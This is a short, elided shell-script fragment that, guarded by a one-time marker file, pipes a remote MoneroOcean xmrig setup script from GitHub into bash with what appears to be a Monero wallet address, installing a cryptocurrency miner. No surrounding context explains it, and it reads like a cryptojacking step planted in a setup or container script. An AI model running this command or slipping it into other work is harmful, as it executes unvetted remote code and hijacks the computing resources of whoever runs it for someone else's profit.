...
if [ ! -e /.miner_setup_done ]; then
  ...
  curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 82YMXuQ351rd7uWHt7yoGHRW1mnRPKEDK6H2YYoV4EFXb9jJS5882WKLZhEoVFpoYZCSdAS6AcsV78rmeh4Ss7RAGYKwczo && \
